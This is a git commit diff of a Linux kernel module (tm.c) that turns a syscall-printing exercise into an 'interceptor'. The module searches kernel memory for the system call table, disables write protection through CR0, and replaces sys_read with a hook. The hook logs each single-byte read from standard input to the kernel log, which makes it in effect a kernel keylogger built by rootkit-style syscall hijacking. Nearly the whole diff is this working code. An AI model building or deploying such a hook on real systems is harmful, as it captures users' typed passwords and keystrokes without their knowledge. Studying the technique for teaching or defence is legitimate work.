e61191174385e03b5616049395c835fd766be135
rajorshi1 <108346962+rajorshi1@users.noreply.github.com>
2022-12-19 03:12:39 +0530

    Update tm.c

--- tm.c
+++ tm.c
@@ -7,58 +7,64 @@
 unsigned long **sys_call_table;
 unsigned long original_cr0;
 
-asmlinkage long (*ref_sys_getgpid)(pid_t pid);
-asmlinkage long new_sys_task_module(pid_t pid)
+asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
+asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
 {
-    struct task_struct *task;
-    task = pid_task(find_vpid(pid), PIDTYPE_PID);
-    if (task == NULL) {
-        printk(KERN_ERR "Invalid PID\n");
-        return -EINVAL;
-    }
-    printk("PID: %d\n", task->pid);
-    printk("Command Path: %s\n", task->comm);
-    return ref_sys_getgpid(pid);
+	long ret;
+	ret = ref_sys_read(fd, buf, count);
+
+	if(count == 1 && fd == 0)
+		printk(KERN_INFO "intercept: 0x%02X", buf[0]);
+
+	return ret;
 }
 
 static unsigned long **aquire_sys_call_table(void)
 {
-    unsigned long int offset = PAGE_OFFSET;
-    unsigned long **sct;
-    while (offset < ULLONG_MAX) {
-        sct = (unsigned long **)offset;
-        if (sct[__NR_close] == (unsigned long *) sys_close)
-            return sct;
-        offset += sizeof(void *);
-    }
-    return NULL;
+	unsigned long int offset = PAGE_OFFSET;
+	unsigned long **sct;
+
+	while (offset < ULLONG_MAX) {
+		sct = (unsigned long **)offset;
+
+		if (sct[__NR_close] == (unsigned long *) sys_close) 
+			return sct;
+
+		offset += sizeof(void *);
+	}
+	
+	return NULL;
 }
 
-static int __init tm_init(void)
+static int __init interceptor_start(void) 
 {
-    if(!(sys_call_table = aquire_sys_call_table()))
-        return -1;
-    original_cr0 = read_cr0();
-    write_cr0(original_cr0 & ~0x00010000);
-    ref_sys_getgpid = (void *)sys_call_table[__NR_getgpid];
-    sys_call_table[__NR_getgpid] = (unsigned long *)new_sys_task_module;
-    write_cr0(original_cr0);
-    return 0;
+	if(!(sys_call_table = aquire_sys_call_table()))
+		return -1;
+	
+	original_cr0 = read_cr0();
+
+	write_cr0(original_cr0 & ~0x00010000);
+	ref_sys_read = (void *)sys_call_table[__NR_read];
+	sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
+	write_cr0(original_cr0);
+	
+	return 0;
 }
 
-static void __exit tm_exit(void)
+static void __exit interceptor_end(void) 
 {
-    if(!sys_call_table) {
-        return;
-    }
-    write_cr0(original_cr0 & ~0x00010000);
-    sys_call_table[__NR_getgpid] = (unsigned long *)ref_sys_getgpid;
-    write_cr0(original_cr0);
-    msleep(2000);
+	if(!sys_call_table) {
+		return;
+	}
+	
+	write_cr0(original_cr0 & ~0x00010000);
+	sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
+	write_cr0(original_cr0);
+	
+	msleep(2000);
 }
 
-module_init(tm_init);
-module_exit(tm_exit);
+module_init(interceptor_start);
+module_exit(interceptor_end);
+
 MODULE_LICENSE("GPL");
-
-
